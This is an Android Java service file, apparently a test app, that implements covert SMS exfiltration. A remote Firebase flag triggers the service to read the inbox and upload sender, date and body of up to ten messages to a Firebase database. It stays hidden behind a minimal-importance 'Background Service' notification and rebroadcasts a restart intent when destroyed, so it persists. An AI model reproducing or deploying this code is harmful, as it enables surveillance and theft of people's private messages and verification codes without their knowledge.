package com.kill390.smsreadtest;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.security.Provider;

import static com.kill390.smsreadtest.SmsReceiver.getDate;

public class MyService extends Service {

//    private SmsReceiver mSMSreceiver;
//    private IntentFilter mIntentFilter;
    DatabaseReference database = FirebaseDatabase.getInstance().getReference().child("users").child("ZdfnDnNDjDij3d");

    @Override
    public void onCreate()
    {
        super.onCreate();

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) {
            startMyOwnForeground();
        }else {
            startForeground(1, new Notification());
        }
        //SMS event receiver
//        mSMSreceiver = new SmsReceiver();
//        mIntentFilter = new IntentFilter();
//        mIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
//        registerReceiver(mSMSreceiver, mIntentFilter);

        new CountDownTimer(100000,1000){

            @Override
            public void onTick(long millisUntilFinished) {
                Log.i("still","working");
            }

            @Override
            public void onFinish() {

            }
        }.start();

        database.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {

                if (snapshot.child("interested").getValue().toString().equals("true")) {
                    readSMS();

                }

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

    }

    public void readSMS(){
        if(checkAndRequestPermissions()) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int i = 1 ;

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {


                    /* important indexes
                        12 body
                        2 address
                        5 date_sent
                    */

                    String msg = "";
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);

                    }
                    // use msgData
                    msg = cursor.getColumnName(5) + ":" + getDate(cursor.getLong(5),"dd/MM/yyyy hh:mm:ss.SSS")+" "+cursor.getColumnName(2) + ":" + cursor.getString(2)+" "+cursor.getColumnName(12) + ":" + cursor.getString(12);

                    Log.i("here", msg);
                    Log.i("not", msgData);

                    database.child("SMS").child("sms" + i).setValue(msg);

                    i++;
                } while (cursor.moveToNext() && i <= 10);
            } else {
                // empty box, no SMS
            }

        }
    }

    private boolean checkAndRequestPermissions()
    {
        int sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        int sms2 = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS);

        if (sms != PackageManager.PERMISSION_GRANTED && sms2 != PackageManager.PERMISSION_GRANTED)
        {
//            ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS}, 1);
            return false;
        }else {
            return true;
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Background Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }


    @Override
    public void onDestroy()
    {
        super.onDestroy();

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, SmsReceiver.class);
        this.sendBroadcast(broadcastIntent);
        // Unregister the SMS receiver
//        unregisterReceiver(mSMSreceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
